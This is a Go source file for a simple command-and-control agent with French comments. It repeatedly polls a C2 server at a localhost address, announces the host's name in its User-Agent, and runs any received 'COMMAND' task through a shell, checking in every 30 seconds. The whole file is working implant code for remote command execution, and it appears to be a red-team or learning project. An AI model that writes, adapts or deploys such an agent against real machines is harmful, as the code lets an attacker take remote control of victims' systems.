package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
    "os/exec"
    "time"
	
)
type Task struct {
    Type        string `json:"Type"`
    User        string `json:"User"`
    Name        string `json:"Name"`
    Description string `json:"Description"`
    Data        string `json:"Data"`
    Timestamp   string `json:"Timestamp"`
    Id          string `json:"Id"`
    After       string `json:"After"`
}

type Request struct {
    NextRequestTime string `json:"NextRequestTime"`
    Tasks           []Task `json:"Tasks"`
}

func main() {
    hostname, _ := os.Hostname()
    agentVersion := "1.0.0"
    system := "Linux"

    for {
        // Crée une requête pour récupérer des tâches auprès du serveur C2
        request := Request{
            NextRequestTime: time.Now().Format(time.RFC3339),
            Tasks:           []Task{},
        }
        requestBody, err := json.Marshal(request)
        if err != nil {
            fmt.Println("Error marshalling request:", err)
            continue
        }

        // Envoie la requête au serveur C2
        client := &http.Client{}
        req, err := http.NewRequest("POST", "http://127.0.0.1:8000/", bytes.NewBuffer(requestBody))
        if err != nil {
            fmt.Println("Error creating request:", err)
            continue
        }
        req.Header.Add("User-Agent", fmt.Sprintf("Agent-C2-EX-MACHINA %s (%s) %s", agentVersion, system, hostname))
        req.Header.Add("Content-Type", "application/json")
        resp, err := client.Do(req)
        if err != nil {
            fmt.Println("Error sending request:", err)
            continue
        }
        defer resp.Body.Close()

        // Lit la réponse et exécute les tâches reçues
        responseBody, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            fmt.Println("Error reading response body:", err)
            continue
        }

        var response Request
        err = json.Unmarshal(responseBody, &response)
        if err != nil {
            fmt.Println("Error unmarshalling response:", err)
            continue
        }

        for _, task := range response.Tasks {
            switch task.Type {
            case "COMMAND":
                output, err := exec.Command("sh", "-c", task.Data).CombinedOutput()
                if err != nil {
                    fmt.Println("Error executing command:", err)
                    continue
                }
                fmt.Println(string(output))
            default:
                fmt.Println("Unknown task type:", task.Type)
                continue
            }
        }

        // Attend 30 secondes avant de récupérer de nouvelles tâches
        time.Sleep(30 * time.Second)
    }
}
